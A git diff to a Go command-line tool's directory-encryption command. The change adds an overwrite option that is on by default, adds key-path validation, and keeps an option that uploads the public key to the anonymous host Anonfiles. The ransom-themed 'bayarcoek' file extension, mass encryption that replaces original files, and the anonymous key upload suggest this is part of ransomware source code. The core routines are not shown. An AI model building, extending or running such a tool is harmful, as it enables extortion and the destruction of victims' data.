@@ -1,6 +1,3 @@
-/*
-Copyright © 2022 NAME HERE <EMAIL ADDRESS>
-*/
 package cmd
 
 import (
@@ -39,22 +36,30 @@ var encryptDirCmd = &cobra.Command{
 				return
 			}
 		}
-		if privateKey != "" {
-			priv, ok := src.GetPrivateKeyFromPath(privateKey)
+		if privateKey == "" && privateKeyPath != "" {
+			priv, ok := src.GetPrivateKeyFromPath(privateKeyPath)
 			if !ok {
 				return
 			}
 			pvKey = priv
 		}
-		if publicKey != "" {
-			pub, ok := src.GetPublicKeyFromPath(publicKey)
+		if publicKey == "" && publicKeyPath != "" {
+			pub, ok := src.GetPublicKeyFromPath(publicKeyPath)
 			if !ok {
 				return
 			}
 			pubKey = pub
 		}
+		if privateKey == "" && privateKeyPath == "" {
+			fmt.Println("ERROR: Missing private key.")
+			return
+		}
+		if generateUrl && publicKey == "" && publicKeyPath == "" {
+			fmt.Println("ERROR: Missing public key.")
+			return
+		}
 		for _, arg := range args {
-			err := src.MakeDirBayarCoek(arg, extension, pvKey)
+			err := src.MakeDirBayarCoek(arg, extension, overwrite, pvKey)
 			if err != nil {
 				return
 			}
@@ -62,7 +67,7 @@ var encryptDirCmd = &cobra.Command{
 		if generateUrl {
 			result, ok := src.UploadKeyToAnonfiles(pubKey)
 			if ok {
-				fmt.Println("Uploaded Key: ", result)
+				fmt.Println("SUCESS:\nUploaded Key: ", result)
 			}
 		}
 	},
@@ -77,4 +82,5 @@ func init() {
 	encryptDirCmd.Flags().StringVar(&publicKey, "publicKey", "", "Public key string.")
 	encryptDirCmd.Flags().StringVarP(&extension, "extension", "e", "bayarcoek", "Encrypted file custom extension.")
 	encryptDirCmd.Flags().BoolVarP(&generateUrl, "url", "u", false, "Generate key url.")
+	encryptDirCmd.Flags().BoolVarP(&overwrite, "overwrite", "o", true, "Overwrite existing files.")
 }
